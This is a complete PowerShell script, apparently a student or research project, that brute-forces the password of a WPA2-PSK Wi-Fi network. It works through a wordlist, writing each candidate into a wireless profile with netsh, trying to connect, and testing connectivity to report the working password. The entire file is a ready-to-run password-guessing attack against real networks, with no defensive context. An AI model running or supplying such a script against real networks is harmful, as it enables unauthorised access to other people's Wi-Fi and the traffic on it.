<#
.SYNOPSIS
    Performs an online dictionary on a given WPA2-PSK Wi-Fi network.

.DESCRIPTION
    Performs an online dictionary on a given WPA2-PSK Wi-Fi network.
    Takes an input network SSID and wordlist then attempts to connect
    to the Wi-Fi network using all passwords in the wordlist.

.INPUTS
    None. You cannot pipe objects to Invoke-OnlineAttack.

.OUTPUTS
    System.String. Invoke-OnlineAttack returns the password as a String.

.NOTES
    Version:        1.0
    Author:         Soufiane Belmir, Ethan Ho, William Lu
    Creation Date:  2021-10-13
    Purpose/Change: Initial script development
  
.EXAMPLE
    PS> .\Invoke-OnlineAttack.ps1 -Wordlist "rockyou.txt"
#>

param
(
    # Wi-Fi network SSID
    [Parameter(Mandatory = $true)]
    [string]
    $SSID,
    
    # Path to wordlist file
    [Parameter(Mandatory = $true)]
    [string]
    $Wordlist
)

# Constants
$TEMPLATE_FILE = "TEMPLATE.xml"
$TEMP_FILE = "online_attack_temp.xml"

# Convert SSID to hex
$SSIDHex = (($SSID.ToCharArray() | 
    ForEach-Object { "{0:x}" -f [byte] $_ }) -join "").ToUpper()

# Read in input files
$Candidates = Get-Content -Path $Wordlist
$TemplateProfile = Get-Content -Path "$PSScriptRoot\$TEMPLATE_FILE"

# Update SSID in template profile
$TemplateProfile = $TemplateProfile -replace "TEMPLATE_SSID_HEX", "$SSIDHex"
$TemplateProfile = $TemplateProfile -replace "TEMPLATE_SSID", "$SSID"

# Keep trying passwords
foreach ($Attempt in $Candidates) {
    $AttemptProfile = $TemplateProfile -replace "TEMPLATE_SHARED_KEY", $Attempt
    $AttemptProfile | Out-File -FilePath "$PSScriptRoot\$TEMP_FILE"

    netsh wlan delete profile $SSID | Out-Null
    netsh wlan add profile filename="$PSScriptRoot\$TEMP_FILE" | Out-Null
    netsh wlan connect name=$SSID | Out-Null

    if (Test-Connection "google.com" -Count 2 -Quiet) {
        $Attempt
    }
}